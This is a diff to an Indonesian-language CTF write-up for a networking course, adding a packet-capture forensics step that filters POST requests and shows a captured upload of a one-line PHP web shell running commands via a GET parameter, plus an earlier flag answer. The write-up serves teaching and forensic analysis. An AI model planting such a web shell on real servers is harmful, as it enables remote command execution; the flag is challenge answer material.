@@ -370,3 +370,52 @@ Format: number
 > 24500
 Benar! Ini flag-mu: JarkomIT{G4jaH_K0k_t3RbaNG_Sh3HWAxiVNHP8q8UZLubxftSdYntCirdRrwYmyUdxIza5zrDSEpLQKt5}
 ```
+
+### inneRCE
+filter 
+```
+http.request.method == "POST" || http.request.method == "PUT"
+```
+cek yg berhasil yaitu
+
+```
+POST /upload.php HTTP/1.1
+Host: 172.24.141.242:8000
+Connection: keep-alive
+Content-Length: 360
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
+Origin: http://172.24.141.242:8000
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryam8WSsNDVFbRRfVY
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://172.24.141.242:8000/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+------WebKitFormBoundaryam8WSsNDVFbRRfVY
+Content-Disposition: form-data; name="fileToUpload"; filename="idzoyyshell.php"
+Content-Type: application/octet-stream
+
+<?php
+
+echo exec($_GET['mintcocscmd']);
+
+?>
+
+------WebKitFormBoundaryam8WSsNDVFbRRfVY
+Content-Disposition: form-data; name="submit"
+
+Upload Image
+------WebKitFormBoundaryam8WSsNDVFbRRfVY--
+HTTP/1.1 200 OK
+Host: 172.24.141.242:8000
+Date: Mon, 16 Sep 2024 06:18:05 GMT
+Connection: close
+X-Powered-By: PHP/8.2.18
+Content-type: text/html; charset=UTF-8
+
+The file idzoyyshell.php has been uploaded.
+```
+ubah waktunya ke waktu indonesia 2024-09-16 13:18:05
+
